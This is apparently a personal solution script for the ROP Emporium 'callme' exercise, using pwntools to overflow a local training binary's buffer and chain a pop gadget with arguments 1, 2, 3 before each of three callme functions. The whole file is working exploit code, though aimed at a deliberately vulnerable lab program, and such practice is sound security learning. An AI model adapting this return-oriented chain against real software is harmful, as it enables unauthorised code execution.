#!/usr/bin/env python

from pwn import *

context.update(terminal=["tmux","splitw","-v"])

e=ELF("/home/cr0c0/ROP_Emporium/callme/callme")

callmeOne=p64(e.symbols["callme_one"])
callmeTwo=p64(e.symbols["callme_two"])
callmeThree=p64(e.symbols["callme_three"])
# 00001ab0 pop gadget
popGadget=p64(e.symbols["usefulGadgets"])

params=p64(1)+p64(2)+p64(3)

crap="A"*40

payload = crap
payload += popGadget + params
payload += callmeOne
payload += popGadget + params
payload += callmeTwo
payload += popGadget + params
payload += callmeThree

gdb.debug(["/home/cr0c0/ROP_Emporium/callme/callme"], """
    b *main
""")

io=e.process()
io.sendline(payload)

io.interactive()